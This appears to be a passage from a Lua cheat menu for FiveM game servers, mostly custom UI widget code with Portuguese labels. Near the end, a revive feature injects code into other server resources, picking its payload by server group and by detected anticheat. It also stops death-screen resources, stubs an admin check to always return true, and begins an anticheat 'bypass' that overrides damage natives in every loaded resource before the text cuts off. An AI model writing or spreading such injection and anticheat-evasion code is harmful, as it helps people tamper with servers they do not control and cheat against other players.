                            nt.createTh(function()
                                func(item)
                            end)
                        end
                        nt.createTh(function()
                            Wait(200)
                            my.frame.blockClicks = false
                        end)
                        break
                    end
                end
            end
        end
        if state.bool and not dropdownHovered and not headerHovered and isLeftButtonJustPressed() then
            state.bool = false
            state.scroll = 0
            my.interact.comboVars.curCombo = false
            nt.createTh(function()
                Wait(200)
                my.frame.blockClicks = false
            end)
        end
    end
    my.interact.sliders = my.interact.sliders or {}
    my.interact.sliderAnimations = my.interact.sliderAnimations or {}
    my.interact.slider = function (id, text, desc, format, values, func, funcdrag)
        local canDisplay, x, y = my.interact.groupboxInfos()
        if not canDisplay then
            return
        end
        values = values or {}
        if not my.interact.sliders[id] then
            my.interact.sliders[id] = {
                min = values.min or 0,
                max = values.max or 100,
                value = values.value or values.start or values.min or 0
            }
        end
        local slider = my.interact.sliders[id]
        slider.min = values.min or slider.min or 0
        slider.max = values.max or slider.max or 100
        if slider.value == nil then
            slider.value = values.value or values.start or slider.min
        end
        local minValue = slider.min
        local maxValue = slider.max
        if maxValue <= minValue then
            maxValue = minValue + 1
            slider.max = maxValue
        end
        slider.value = math.max(minValue, math.min(maxValue, slider.value))
        local value = slider.value
        if not my.interact.sliderAnimations[id] then
            my.interact.sliderAnimations[id] = {
                r = 75.0,
                g = 75.0,
                b = 75.0,
                fill = 0.0,
                active = false
            }
        end
        local state = my.interact.sliderAnimations[id]
        local uniqueid = tostring(id or '') .. tostring(text or '') .. tostring(my.interact.groupboxVars.curGroupbox or '')
        local groupW = my.interact.groupboxVars.width
        local rowH = 20
        local rowX = x + 10
        local rowY = y - (rowH / 2)
        local rowW = groupW - 20
        local textScale = 15.5
        local labelText = tostring(text or '')
        local labelX = rowX + 3
        local labelY = rowY + 2
        local labelW = my.texts.getTextWidth(labelText, textScale) or 0.0
        local titleToSliderGap = 8
        local sliderRight = x + groupW - 55
        local sliderX = labelX + labelW + titleToSliderGap
        local sliderW = sliderRight - sliderX
        if sliderW > 120 then
            sliderW = 120
        end
        if sliderW < 22 then
            sliderW = 22
            sliderX = sliderRight - sliderW
        end
        local sliderH = 7
        local sliderY = rowY + 8
        local hovered = my.mouse.isHovered(rowX, rowY, rowW, rowH)
        local sliderHovered = my.mouse.isHovered(sliderX - 4, sliderY - 5, sliderW + 8, sliderH + 10)
        local targetText = hovered and 240 or 75
        state.r = my.anim.lerp(state.r, targetText, 0.08)
        state.g = my.anim.lerp(state.g, targetText, 0.08)
        state.b = my.anim.lerp(state.b, targetText, 0.08)
        local range = maxValue - minValue
        local percentage = (value - minValue) / range
        percentage = math.max(0.0, math.min(1.0, percentage))
        local filledWidth = math.floor(sliderW * percentage)
        state.fill = my.anim.lerp(state.fill, filledWidth, 0.15)
        local curAnim = math.max(0, math.min(sliderW, state.fill))
        my.texts.drawText(
            labelText,
            labelX,
            labelY,
            false,
            'left',
            textScale,
            {math.ceil(state.r), math.ceil(state.g), math.ceil(state.b), 255},
            13,
            '##sliderText_' .. uniqueid
        )
        local precision = tonumber(format)
        local valueText
        if precision then
            valueText = string.format('%.' .. tostring(math.max(0, math.floor(precision))) .. 'f', value)
        else
            valueText = tostring(math.floor(value))
        end
        local valueColor = state.active and 255 or 150
        my.texts.drawText(
            valueText,
            x + groupW - 42,
            labelY,
            false,
            'left',
            14.0,
            {valueColor, valueColor, valueColor, (hovered or state.active) and 255 or 0},
            15,
            '##sliderValue_' .. uniqueid
        )
        my.ui.drawRect(
            sliderX,
            sliderY,
            sliderW,
            sliderH,
            {30, 30, 35, 255},
            sliderH / 2,
            false,
            13,
            '##sliderBg_' .. uniqueid
        )
        if curAnim > 0.01 then
            my.ui.drawRect(
                sliderX,
                sliderY,
                curAnim,
                sliderH,
                {my.colors.main[1], my.colors.main[2], my.colors.main[3], 255},
                sliderH / 2,
                false,
                14,
                '##sliderFill_' .. uniqueid
            )
        end
        local knobWidth = 6
        local knobHeight = sliderH + 6
        local knobX = sliderX + curAnim - knobWidth / 2
        local knobY = sliderY - (knobHeight - sliderH) / 2
        my.ui.drawRect(
            knobX,
            knobY,
            knobWidth,
            knobHeight,
            {220, 220, 225, 255},
            1,
            false,
            15,
            '##sliderKnob_' .. uniqueid
        )
        local leftPressed = isLeftButtonPressed()
        if (sliderHovered or state.active) and leftPressed and not my.frame.blockClicks then
            state.active = true
            local cursorX = my.mouse.getMouseX()
            local relativeX = math.max(0, math.min(sliderW, cursorX - sliderX))
            local ratio = relativeX / sliderW
            local newValue = minValue + (range * ratio)
            if precision then
                local p = math.max(0, math.floor(precision))
                local mult = 10 ^ p
                newValue = math.floor(newValue * mult + 0.5) / mult
            else
                newValue = math.floor(newValue)
            end
            newValue = math.max(minValue, math.min(maxValue, newValue))
            if newValue ~= slider.value then
                slider.value = newValue
                if funcdrag and type(funcdrag) == 'function' then
                    nt.createTh(function()
                        funcdrag(newValue)
                    end)
                elseif func and type(func) == 'function' then
                    nt.createTh(function()
                        func(newValue)
                    end)
                end
            end
        elseif not leftPressed then
            state.active = false
        end
    end
    my.interact.colorpickers = {}
    my.interact.colorpickerAnimations = my.interact.colorpickerAnimations or {}
    my.interact.colorpicker = function (id, text, desc, defcolor, func, funcdrag)
        local canDisplay, x, y = my.interact.groupboxInfos()
        if not canDisplay then
            return
        end
        local initialColor = defcolor or {255, 255, 255, 255}
        local initialRGB = {
            initialColor[1] or 255,
            initialColor[2] or 255,
            initialColor[3] or 255,
            initialColor[4] or 255
        }
        if not my.interact.colorpickers[id] then
            local h, s, v = my.math.RGBtoHSV(initialRGB)
            my.interact.colorpickers[id] = {
                active = false,
                color = {initialRGB[1], initialRGB[2], initialRGB[3], initialRGB[4]},
                alpha = initialRGB[4],
                hue = h or 0,
                saturation = s or 0,
                value = v or 100,
                alphaAnim = 0.0,
                selectedX = nil,
                selectedY = nil,
                hex = my.math.rgbToHex(initialRGB)
            }
        end
        local state = my.interact.colorpickers[id]
        state.color = state.color or {initialRGB[1], initialRGB[2], initialRGB[3], initialRGB[4]}
        state.alpha = state.alpha or state.color[4] or initialRGB[4]
        state.hue = state.hue or 0
        state.alphaAnim = state.alphaAnim or 0.0
        if state.saturation == nil or state.value == nil then
            local h, s, v = my.math.RGBtoHSV({
                state.color[1] or 255,
                state.color[2] or 255,
                state.color[3] or 255,
                state.alpha or 255
            })
            state.hue = state.hue or h or 0
            state.saturation = s or 0
            state.value = v or 100
        end
        local uniqueid =
            tostring(id or '') ..
            tostring(text or '') ..
            tostring(my.interact.groupboxVars.curGroupbox or '')
        local rowX = x + 10
        local rowY = y - 9
        local rowW = my.interact.groupboxVars.width - 20
        local rowH = 18
        local rowHovered = my.mouse.isHovered(rowX, rowY, rowW, rowH)
        if not my.interact.colorpickerAnimations[id] then
            my.interact.colorpickerAnimations[id] = {
                r = rowHovered and 255.0 or 65.0,
                g = rowHovered and 255.0 or 65.0,
                b = rowHovered and 255.0 or 65.0,
                previewR = state.color[1] or 255,
                previewG = state.color[2] or 255,
                previewB = state.color[3] or 255
            }
        end
        local anim = my.interact.colorpickerAnimations[id]
        local targetText = rowHovered and 255 or 65
        anim.r = my.anim.lerp(anim.r, targetText, 0.05)
        anim.g = my.anim.lerp(anim.g, targetText, 0.05)
        anim.b = my.anim.lerp(anim.b, targetText, 0.05)
        anim.previewR = my.anim.lerp(anim.previewR, state.color[1] or 255, 0.05)
        anim.previewG = my.anim.lerp(anim.previewG, state.color[2] or 255, 0.05)
        anim.previewB = my.anim.lerp(anim.previewB, state.color[3] or 255, 0.05)
        local textColor = {
            math.ceil(anim.r),
            math.ceil(anim.g),
            math.ceil(anim.b),
            255
        }
        local textScale = 15.5
        my.texts.drawText(
            text,
            rowX,
            y - (textScale / 2),
            false,
            'left',
            textScale,
            textColor,
            4,
            '##colorpickerText_' .. uniqueid
        )
        local previewW, previewH = 14, 14
        local previewX = x + my.interact.groupboxVars.width - 24
        local previewY = y - (previewH / 2)
        my.ui.drawRect(
            previewX,
            previewY,
            previewW,
            previewH,
            {
                math.ceil(anim.previewR),
                math.ceil(anim.previewG),
                math.ceil(anim.previewB),
                255
            },
            99,
            false,
            5,
            '##colorpickerPreview_' .. uniqueid
        )
        if rowHovered and isLeftButtonJustPressed() and not my.frame.blockClicks then
            state.active = not state.active
            my.frame.blockClicks = state.active
            if state.active and func and type(func) == 'function' then
                func({state.color[1], state.color[2], state.color[3], state.alpha})
            end
        end
        if state.active and (
            IsDisabledControlPressed(1, 15) or
            IsDisabledControlPressed(1, 14)
        ) then
            state.active = false
            my.frame.blockClicks = false
        end
        local targetAlpha = state.active and 255 or 0
        state.alphaAnim = my.anim.lerp(state.alphaAnim, targetAlpha, 0.15)
        if math.abs(state.alphaAnim - targetAlpha) < 1 then
            state.alphaAnim = targetAlpha
        end
        local overlayAlpha = math.floor(state.alphaAnim + 0.5)
        if overlayAlpha <= 5 then
            return
        end
        local panelW, panelH = 218, 180
        local panelX = x + my.interact.groupboxVars.width - 25
        local panelY = y + 31
        local gradientX = panelX + 10
        local gradientY = panelY + 10
        local gradientW = 198
        local gradientH = 142
        local hueX = panelX + 10
        local hueY = panelY + 162
        local hueW = 198
        local hueH = 8
        my.ui.drawRect(
            panelX - 1,
            panelY - 1,
            panelW + 2,
            panelH + 2,
            {23, 24, 26, overlayAlpha},
            6,
            false,
            20,
            '##colorpickerOuter_' .. uniqueid
        )
        my.ui.drawRect(
            panelX,
            panelY,
            panelW,
            panelH,
            {39, 39, 39, overlayAlpha},
            6,
            false,
            21,
            '##colorpickerPanel_' .. uniqueid
        )
        local pureHue = my.math.HSVtoRGB(state.hue, 100, 100)
        my.ui.drawRect(
            gradientX,
            gradientY,
            gradientW,
            gradientH,
            {pureHue[1], pureHue[2], pureHue[3], overlayAlpha},
            6,
            false,
            22,
            '##colorpickerHueBase_' .. uniqueid
        )
        my.ui.drawImage(
            'colorpicker_gradient',
            gradientX,
            gradientY,
            gradientW,
            gradientH,
            {255, 255, 255, overlayAlpha},
            23,
            '##colorpickerGradient_' .. uniqueid
        )
        my.ui.drawImage(
            'colorpicker_huebar',
            hueX,
            hueY,
            hueW,
            hueH,
            {255, 255, 255, overlayAlpha},
            24,
            '##colorpickerHue_' .. uniqueid
        )
        local cursorX = gradientX + ((state.saturation or 0) / 100) * (gradientW - 1)
        local cursorY = gradientY + (1 - ((state.value or 100) / 100)) * (gradientH - 1)
        my.ui.drawRect(
            cursorX - 3,
            cursorY - 3,
            7,
            7,
            {255, 255, 255, overlayAlpha},
            3,
            false,
            26,
            '##colorpickerCursor_' .. uniqueid
        )
        local hueCursorX = hueX + ((state.hue or 0) / 360) * (hueW - 1)
        my.ui.drawRect(
            hueCursorX - 2,
            hueY - 4,
            5,
            16,
            {255, 255, 255, overlayAlpha},
            99,
            false,
            26,
            '##colorpickerHueCursor_' .. uniqueid
        )
        local mouseX, mouseY = my.mouse.getCursorPosition()
        local overGradient = my.mouse.isHovered(
            gradientX,
            gradientY,
            gradientW,
            gradientH
        )
        local overHue = my.mouse.isHovered(
            hueX,
            hueY,
            hueW,
            hueH
        )
        if isLeftButtonPressed() then
            local changed = false
            if overGradient then
                state.saturation = math.max(
                    0,
                    math.min(100, ((mouseX - gradientX) / (gradientW - 1)) * 100)
                )
                state.value = math.max(
                    0,
                    math.min(100, (1 - ((mouseY - gradientY) / (gradientH - 1))) * 100)
                )
                changed = true
            elseif overHue then
                state.hue = math.max(
                    0,
                    math.min(360, ((mouseX - hueX) / (hueW - 1)) * 360)
                )
                changed = true
            end
            if changed then
                local newColor = my.math.HSVtoRGB(
                    state.hue,
                    state.saturation,
                    state.value
                )
                state.color = {
                    math.floor(newColor[1]),
                    math.floor(newColor[2]),
                    math.floor(newColor[3]),
                    state.alpha
                }
                state.hex = my.math.rgbToHex(state.color)
                if funcdrag and type(funcdrag) == 'function' then
                    funcdrag({
                        state.color[1],
                        state.color[2],
                        state.color[3],
                        state.alpha
                    })
                end
            end
        end
        local overPanel = my.mouse.isHovered(
            panelX,
            panelY,
            panelW,
            panelH
        )
        if state.active then
            if IsKeyJustPressed(myAPI.Keys['ESC']) then
                state.active = false
                my.frame.blockClicks = false
            elseif isLeftButtonJustPressed() and not rowHovered and not overPanel then
                state.active = false
                my.frame.blockClicks = false
            end
        end
    end
    my.interact.inputs = my.interact.inputs or {}
    my.interact.input = function(id, text, storage, storageKey, icon, search, func)
        local canDisplay, x, y = my.interact.groupboxInfos()
        if not canDisplay then return end
        storage = storage or {}
        storageKey = storageKey or id
        if storage[storageKey] == nil then
            storage[storageKey] = ''
        end
        if not my.interact.inputs[id] then
            my.interact.inputs[id] = {
                active = false,
                text = tostring(storage[storageKey] or ''),
                r = 75.0, g = 75.0, b = 75.0
            }
        end
        local state = my.interact.inputs[id]
        if not state.active then
            state.text = tostring(storage[storageKey] or state.text or '')
        end
        local rowX = x + 10
        local rowY = y - 10
        local rowW = my.interact.groupboxVars.width - 20
        local rowH = 20
        local titleScale = 16.0
        local titleText = tostring(text or '')
        local titleWidth = my.texts.getTextWidth(titleText, titleScale) or 0
        local inputY = rowY + 3
        local inputH = 15
        local iconSlot = 30
        local inputEnd = rowX + rowW + 3
        local inputX = rowX + 3 + titleWidth + 8
        local inputW = inputEnd - inputX - iconSlot
        if inputW < 42 then
            inputW = 42
            inputX = inputEnd - iconSlot - inputW
        end
        local fieldHover = my.mouse.isHovered(inputX, inputY, inputW, inputH)
        local rowHover = my.mouse.isHovered(rowX, rowY, rowW, rowH)
        local target = state.active and 220 or (rowHover and 180 or 75)
        state.r = my.anim.lerp(state.r or 75, target, 0.08)
        state.g = my.anim.lerp(state.g or 75, target, 0.08)
        state.b = my.anim.lerp(state.b or 75, target, 0.08)
        local cr, cg, cb = math.ceil(state.r), math.ceil(state.g), math.ceil(state.b)
        local uniqueid = tostring(id or '') .. tostring(my.interact.groupboxVars.curGroupbox or '')
        my.texts.drawText(
            titleText,
            rowX + 3,
            rowY + 2,
            false,
            'left',
            titleScale,
            {cr, cg, cb, 255},
            10,
            '##inputTitle_' .. uniqueid
        )
        my.ui.drawRect(
            inputX,
            inputY,
            inputW,
            inputH,
            {20, 20, 20, 255},
            3,
            false,
            10,
            '##inputBg_' .. uniqueid
        )
        local iconX = inputX + inputW + 10
        local inputIcon
        if search then
            inputIcon = my.fontAwesome.icons.search
        elseif type(icon) == 'string' and icon ~= '' then
            inputIcon = icon
        else
            inputIcon = my.fontAwesome.icons.eye
        end
        my.ui.drawFontAwesome(
            inputIcon,
            iconX,
            inputY,
            16.0,
            {my.colors.main[1], my.colors.main[2], my.colors.main[3], 255},
            true,
            11,
            '##inputIcon_' .. uniqueid
        )
        local displayText = tostring(state.text or '')
        local maxTextW = math.max(5, inputW - 10)
        while #displayText > 0 and (my.texts.getTextWidth(displayText, 14.0) or 0) > maxTextW do
            displayText = string.sub(displayText, 2)
        end
        local textColor = state.active and {255, 255, 255, 255} or {180, 180, 180, 255}
        my.texts.drawText(
            displayText,
            inputX + 5,
            inputY,
            false,
            'left',
            14.0,
            textColor,
            11,
            '##inputValue_' .. uniqueid
        )
        if state.active and (GetGameTimer() % 1000) < 500 then
            local shownW = my.texts.getTextWidth(displayText, 14.0) or 0
            local cursorX = math.min(inputX + inputW - 3, inputX + 5 + shownW)
            my.ui.drawRect(
                cursorX,
                inputY + 1,
                1,
                12,
                {255, 255, 255, 255},
                0,
                false,
                12,
                '##inputCursor_' .. uniqueid
            )
        else
            my.ui.drawRect(
                inputX,
                inputY,
                1,
                1,
                {0, 0, 0, 0},
                0,
                false,
                12,
                '##inputCursor_' .. uniqueid
            )
        end
        if fieldHover and isLeftButtonJustPressed() and not my.frame.blockClicks then
            for otherId, other in pairs(my.interact.inputs) do
                if otherId ~= id then other.active = false end
            end
            state.active = true
        end
        if state.active then
            local changed = false
            if IsKeyJustPressed(myAPI.Keys['ESC']) or IsKeyJustPressed(myAPI.Keys['ENTER']) then
                state.active = false
                if func and type(func) == 'function' then func(state.text) end
            elseif isLeftButtonJustPressed() and not fieldHover then
                state.active = false
                if func and type(func) == 'function' then func(state.text) end
            else
                for txtKey, keyCode in pairs(myAPI.keysTextBox) do
                    if keyCode and IsKeyJustPressed(keyCode) then
                        local add = tostring(txtKey)
                        if IsKeyPressed(myAPI.Keys['SHIFT']) then
                            add = string.upper(add)
                        end
                        state.text = tostring(state.text or '') .. add
                        changed = true
                    end
                end
                if IsKeyPressed(myAPI.Keys['BACKSPACE']) and ((state.backDelay or 0) <= GetGameTimer()) then
                    state.backDelay = GetGameTimer() + 100
                    state.text = string.sub(tostring(state.text or ''), 1, -2)
                    changed = true
                end
            end
            storage[storageKey] = tostring(state.text or '')
            if changed and func and type(func) == 'function' then
                func(storage[storageKey])
            end
        else
            storage[storageKey] = tostring(state.text or storage[storageKey] or '')
        end
    end
    my.interact.dragVars =
    {
    colorArrow = {my.colors.drag.arrow.r, my.colors.drag.arrow.g, my.colors.drag.arrow.b, 255},
    pos = {x = 0.0, y = 0.0},
    alpha = 0.0
    }
    function my.interact.drag()
    -- Neutralize old named drawings if the renderer retains them between loads.
    my.ui.drawRect(-100, -100, 1, 1, {0, 0, 0, 0}, 0, false, 2, '##dragBackgrounddefault')
    my.ui.drawRect(-100, -100, 1, 1, {0, 0, 0, 0}, 0, false, 2, '##dragBackgroundhovered')
    my.ui.drawImage('move_icon', -100, -100, 1, 1, {255, 255, 255, 0}, 3, '##dragArrowIcon')
    local x, y = my.pos.mainBackground.x, my.pos.mainBackground.y
    local wIcon, hIcon = 40, 40
    local xIcon, yIcon = x, y
    local isIconHover = my.mouse.isHovered(xIcon, yIcon, wIcon, hIcon)
    local cursorPosX, cursorPosY = my.mouse.getCursorPosition()
    if isIconHover and isLeftButtonJustPressed() then
        my.cache.maindragX = my.interact.dragVars.pos.x - cursorPosX
        my.cache.maindragY = my.interact.dragVars.pos.y - cursorPosY
        my.cache.mainDragging = true
    elseif not isLeftButtonPressed() then
        my.cache.mainDragging = false
    end
    if my.cache.mainDragging then
        my.interact.dragVars.pos.x = cursorPosX + my.cache.maindragX
        my.interact.dragVars.pos.y = cursorPosY + my.cache.maindragY
    end
    my.vars.dragPos.x = my.anim.lerp(my.vars.dragPos.x, my.interact.dragVars.pos.x, my.vars.animVels.main*2)
    my.vars.dragPos.y = my.anim.lerp(my.vars.dragPos.y, my.interact.dragVars.pos.y, my.vars.animVels.main*2)
    end
    my.others = {}
    function my.others.isSearching()
    return (my.interact.searchVars.text ~= '')
    end
    function my.others.searchCheck(input, text)
    return text:lower():find(input:lower(), 1, true) ~= nil
    end
    function my.others.isAdmin(player)
    return true
    end
    function my.others.bindsCheck()
        for id, bind in pairs(my.binds.buttons) do
            if bind.key ~= nil and bind.key ~= 999 and IsKeyJustPressed(bind.key) then
                if not bind.BindNowButton then
                    if bind.func and type(bind.func) == 'function' then
                        nt.createTh(bind.func)
                    end
                else
                    bind.BindNowButton = false
                end
            end
        end
        for id, bind in pairs(my.binds.checkboxes) do
            if bind.key ~= nil and bind.key ~= 999 and IsKeyJustPressed(bind.key) then
                nt.createTh(function()
                    if not bind.BindNowCheckBox then
                        my.interact.checkboxVars.curCheckbox = id
                        my.bool[id] = not (my.bool[id] or false)
                        if not my.bool[id] then
                            my.interact.checkboxVars.disable = true
                        else
                            my.interact.checkboxVars.alpha = 0
                            my.interact.checkboxVars.x = 12
                        end
                        if bind.func and type(bind.func) == 'function' then
                            bind.func()
                        end
                    else
                        bind.BindNowCheckBox = false
                    end
                end)
            end
        end
    end
    my.interact.rendernextFeatures = function(alphaTab, alphaSubtab)
        next.vars.tab_selected = alphaTab
        next.vars.subtab_selected = alphaSubtab
        next.values.checkbox = next.values.checkbox or {}
        next.values.slider = next.values.slider or {}
        next.values.input = next.values.input or {}
        next.values.combobox = next.values.combobox or {}
        next.values.colorpicker = next.values.colorpicker or {}
        local currentBox = nil
        local boxSerial = 0
        local function safeId(value, fallback)
            local txt = tostring(value ~= nil and value or fallback or '')
            txt = string.gsub(txt, '[^%w_:%-%.]', '_')
            return 'ax_' .. txt
        end
        local function flushGroupbox()
            if not currentBox then return end
            my.interact.groupbox(
                currentBox.id,
                currentBox.name,
                currentBox.height,
                currentBox.items,
                currentBox.x,
                currentBox.y,
                currentBox.icon
            )
            currentBox = nil
        end
        local function ensureGroupbox()
            if not currentBox then
                boxSerial = boxSerial + 1
                currentBox = {id = 'ax_auto_'..tostring(boxSerial), name = 'next', height = 210, items = {}}
            end
            return currentBox
        end
        local function pickCallback(...)
            local args = {...}
            for i = #args, 1, -1 do
                if type(args[i]) == 'function' then return args[i] end
            end
            return nil
        end
        next.elements.groupbox = function(name, id, icon, x, y, w, h)
            flushGroupbox()
            boxSerial = boxSerial + 1
            currentBox = {
                id = safeId(id, 'group_'..boxSerial),
                name = tostring(name or 'next'),
                icon = (type(icon) == 'string' and icon ~= '') and icon or nil,
                height = math.max(120, math.min(440, tonumber(h) or 210)),
                x = tonumber(x),
                y = tonumber(y),
                items = {}
            }
        end
        next.elements.button = function(text, id, ...)
            local cb = pickCallback(...)
            local box = ensureGroupbox()
            table.insert(box.items, {
                type = 'button', id = safeId(id, text), text = tostring(text or 'Button'),
                func = function()
                    if cb then cb() end
                    if alphaTab == 'Temas' and next.colors and next.colors.theme then
                        my.colors.main = {next.colors.theme[1], next.colors.theme[2], next.colors.theme[3], 255}
                    end
                end
            })
        end
        next.elements.checkbox = function(text, id, ...)
            local cb = pickCallback(...)
            local uid = safeId(id, text)
            if my.bool[uid] == nil then
                my.bool[uid] = next.values.checkbox[id] == true
            end
            next.values.checkbox[id] = my.bool[uid] == true
            local box = ensureGroupbox()
            table.insert(box.items, {
                type = 'checkbox', id = uid, text = tostring(text or 'Checkbox'),
                func = function()
                    local state = my.bool[uid] == true
                    next.values.checkbox[id] = state
                    if cb then cb(state) end
                end
            })
        end
        next.elements.slider = function(text, id, values, ...)
            values = type(values) == 'table' and values or {}
            local cb = pickCallback(...)
            local uid = safeId(id, text)
            local initial = next.values.slider[id]
            if initial == nil then initial = values.start or values.value or values.min or 0 end
            if my.interact.sliders[uid] and my.interact.sliders[uid].value ~= nil then
                initial = my.interact.sliders[uid].value
            end
            next.values.slider[id] = initial
            local box = ensureGroupbox()
            table.insert(box.items, {
                type = 'slider', id = uid, text = tostring(text or 'Slider'),
                table = {min = values.min or 0, max = values.max or 100, value = initial, start = initial},
                funcdrag = function(value)
                    next.values.slider[id] = value
                    if cb then cb(value) end
                end
            })
        end
        next.elements.input = function(text, id, default, ...)
            local cb = pickCallback(...)
            local uid = safeId(id, text)
            if next.values.input[id] == nil then next.values.input[id] = tostring(default or '') end
            local box = ensureGroupbox()
            if id == 'search:player' then
                table.insert(box.items, {
                    type = 'listsearch', id = uid, text = 'Pesquisar', storage = next.values.input, storageKey = id
                })
                return
            elseif id == 'vehicle_search' then
                if next.values.input[id] == nil then
                    next.values.input[id] = ''
                end
                table.insert(box.items, {
                    type = 'listsearch', id = uid, text = 'Pesquisar', storage = next.values.input, storageKey = id
                })
                return
            end
            local args = {...}
            local icon = nil
            local search = false
            for _, arg in ipairs(args) do
                if type(arg) == 'string' and icon == nil then
                    icon = arg
                elseif type(arg) == 'boolean' then
                    search = arg
                end
            end
            local inputState = my.interact.inputs and my.interact.inputs[uid]
            if inputState and inputState.text ~= nil then
                next.values.input[id] = inputState.text
            end
            table.insert(box.items, {
                type = 'input',
                id = uid,
                text = tostring(text or 'Input'),
                storage = next.values.input,
                storageKey = id,
                icon = icon,
                search = search,
                func = function(value)
                    next.values.input[id] = tostring(value or '')
                    if cb then cb(next.values.input[id]) end
                end
            })
        end
        next.elements.combobox = function(text, id, items, default, ...)
            items = type(items) == 'table' and items or {}
            local cb = pickCallback(...)
            local uid = safeId(id, text)
            local selected = next.values.combobox[id] or default or items[1]
            if my.interact.comboBoxes[uid] and my.interact.comboBoxes[uid].option then
                selected = my.interact.comboBoxes[uid].option
            end
            next.values.combobox[id] = selected
            local box = ensureGroupbox()
            table.insert(box.items, {
                type = 'combobox', id = uid, text = tostring(text or 'Combobox'), combotext = 'Selecionar',
                table = items, defoption = selected,
                func = function(value)
                    next.values.combobox[id] = value
                    if cb then cb(value) end
                end
            })
        end
        next.elements.colorpicker = function(text, id, ...)
            local args = {...}
            local cb = pickCallback(...)
            local default = {255,255,255,255}
            for _, value in ipairs(args) do
                if type(value) == 'table' then
                    if value.r then default = {value.r or 255, value.g or 255, value.b or 255, value.a or 255}
                    elseif value[1] then default = {value[1] or 255, value[2] or 255, value[3] or 255, value[4] or 255} end
                end
            end
            local uid = safeId(id, text)
            local box = ensureGroupbox()
            table.insert(box.items, {
                type = 'colorpicker', id = uid, text = tostring(text or 'Color'), defcolor = default,
                funcdrag = function(color)
                    next.values.colorpicker[id] = {r=color[1], g=color[2], b=color[3], a=color[4] or 255}
                    if cb then cb(next.values.colorpicker[id]) end
                    if alphaTab == 'Temas' and next.colors and next.colors.theme then
                        my.colors.main = {next.colors.theme[1], next.colors.theme[2], next.colors.theme[3], 255}
                    end
                end
            })
        end
        next.elements.list = function(value, selected, callback, text, ...)
            local args = {...}
            local color = nil
            if tonumber(args[1]) and tonumber(args[2]) and tonumber(args[3]) then
                color = {tonumber(args[1]), tonumber(args[2]), tonumber(args[3])}
            end
            local box = ensureGroupbox()
            local label = tostring(text or value or 'Item')
            table.insert(box.items, {
                type = 'listitem', id = safeId('list_'..tostring(value), label), text = label,
                selected = selected == true, color = color,
                func = function() if callback then callback() end end
            })
        end
        next.elements.notify = function(message, kind, time)
            local normalized = string.lower(tostring(kind or 'info'))
            local map = {
                success = 'success', sucesso = 'success',
                error = 'error', erro = 'error',
                warning = 'warning', aviso = 'warning',
                info = 'info', information = 'info'
            }
            local finalKind = map[normalized] or 'info'
            local msg = tostring(message or '')
            local ok = pcall(function()
                my.interact.notify(msg, finalKind, time)
            end)
            if not ok then
                local direct = {
                    success = {name = 'Sucesso', icon = 'f058'},
                    info = {name = 'Info', icon = 'f05a'},
                    error = {name = 'Erro', icon = 'f057'},
                    warning = {name = 'Aviso', icon = 'f071'},
                }
                local data = direct[finalKind] or direct.info
                pcall(function()
                    my.interact.Notify(msg, data.name, data.icon, time or 5000)
                end)
            end
        end
        my.interact.groupboxVars.pos.x = 0.0
        my.interact.groupboxVars.pos.y = 0.0
        my.interact.groupboxVars.maxHeight = 445
                if next.vars.tab_selected == "Jogador" then
                    if next.vars.subtab_selected == "Geral" then
                    next.elements.groupbox("Principal", "principal", "\xef\x93\xbb", 0, 0, 300, 260)
Reviver = function()
    local ped = PlayerPedId()
    local isDead = IsEntityDead(ped) or GetEntityHealth(ped) <= 100
    if not isDead then return end
    local value = 400
    local revived = false
    SetEntityCollision(ped, true, true)
    FreezeEntityPosition(ped, false)
    ClearPedTasks(ped)
    ClearPedTasksImmediately(ped)
    if group == "Santa Group" then
        FrameAPI.Inject("survival", [[
            exports["survival"]:Revive(400, true)
        ]])
        revived = true
    elseif group == "Fusion Group" then
        FrameAPI.Inject('painel_hospital', [[
            local health = GetEntityHealth(PlayerPedId())
            local armour = GetPedArmour(PlayerPedId())
            TriggerEvent("wdwkdoaxq", armour)
            TriggerEvent("resetBleeding")
            TriggerEvent("resetDiagnostic")
            TriggerEvent("tratamento-macas")
        ]])
        revived = true
    elseif anticheat == "Não Detectado" or anticheat == "Fiveguard" then
        SetEntityHealth(ped, 400)
        revived = true
    elseif group == "Lotus Group" then
        SetEntityHealth(ped, 400)
        revived = true
    elseif group == "Noway Group" then
        FrameAPI.Inject("survival", [[
        cO.revivePlayer(400)
        ]])
        revived = true
    elseif group == "Space Group" then
        FrameAPI.Inject('space-module', [[
            TriggerEvent('space-module:client:interfaces:respawn:reviveMedic', 400)
        ]])
        revived = true
    elseif group == "Nexus Group" then
        FrameAPI.Inject("survival", [[
            nocauteado = false
            TriggerEvent("nRevive")
            NetworkResurrectLocalPlayer(GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true, false)
            SetEntityHealth(PlayerPedId(), 400)
        ]])
        revived = true
    end
    Wait(150)
    if GetEntityHealth(ped) ~= value then
        local deathResources = {
            'mirtin_survival', 'survival', 'nxgroup-survival', 'vrp_survival',
            'garty-survival', 'lisboa-survival', 'dharma_survival', 'wnSurvival',
            'deadscreen', 'ic3d_deathscreen', 'DeathScreen', 'uniq-deathscreen',
            'neo_death', 'europa_deathscreen', 'mirtin_survival_v2', 'death',
            'nyo_death', 'qb-death'
        }
        for _, resource in ipairs(deathResources) do
            FrameAPI.StopResource(resource)
        end
        FrameAPI.Inject('mirtin_survival', [[
            SetNuiFocus(false, false)
            NuiFocus = false
            SendNUIMessage({ action = "setVisible", data = false })
        ]])
        local attempts = {
            function() LocalPlayer.state["health"] = value end,
            function() LocalPlayer.state["curhealth"] = value end,
            function() NetworkResurrectLocalPlayer(GetEntityCoords(ped), GetEntityHeading(ped), 0, 0) end,
            function() ResurrectPed(ped) end
        }
        for _, attempt in ipairs(attempts) do
            if GetEntityHealth(ped) ~= value then
                Wait(150)
                attempt()
            else
                break
            end
        end
    end
    next.elements.notify("Revivido Com Sucesso!", "success")
end
    if anticheat ~= "ThnAC" or anticheat ~= "PL_PROTECT" or anticheat ~= "EQPG" then
    next.elements.button("Reviver", "reviver", function()
        Reviver()
    end)
end

if anticheat == "ThnAC" or anticheat == "PL_PROTECT" or anticheat == "EQPG" then
next.elements.button("Reviver", "revive2r_bypass", function()
    for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
        FrameAPI.Inject(resourceName, [[
        Citizen.CreateThread(function()
            _hxp_revive_ver = (_hxp_revive_ver or 0) + 1
            local myVersion = _hxp_revive_ver

            local function reviveOverrides()
                SetEntityHealth                     = function() return true end
                SetEntityInvincible                 = function() return true end
                SetPlayerInvincible                 = function() return true end
                SetEntityCanBeDamaged               = function() return true end
